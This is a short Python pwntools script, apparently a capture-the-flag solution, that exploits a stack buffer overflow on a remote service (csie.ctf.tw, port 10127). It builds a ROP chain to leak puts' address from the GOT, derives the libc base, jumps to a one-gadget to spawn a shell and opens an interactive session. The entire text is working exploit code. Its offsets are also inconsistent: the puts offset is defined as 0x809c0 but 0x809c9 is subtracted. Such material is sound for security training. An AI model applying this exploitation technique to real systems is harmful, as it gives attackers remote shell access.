from pwn import *

context.arch = 'amd64'

r = remote('csie.ctf.tw', 10127)
payload = 16*'a'

puts_got = 0x601018
pop_rdi = 0x400673
puts_plt = 0x4004a0
main = 0x4005b7
puts_lic = 0x809c0

r.sendline(payload + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main))
r.recvuntil('\n')

leak_puts = u64(r.recvuntil('\n').strip().ljust(8, '\x00'))
print hex(leak_puts)
base = leak_puts - 0x809c9
print hex(base)
onegadget = base + 0x4f2c5

r.sendline(payload + p64(onegadget))
r.interactive()
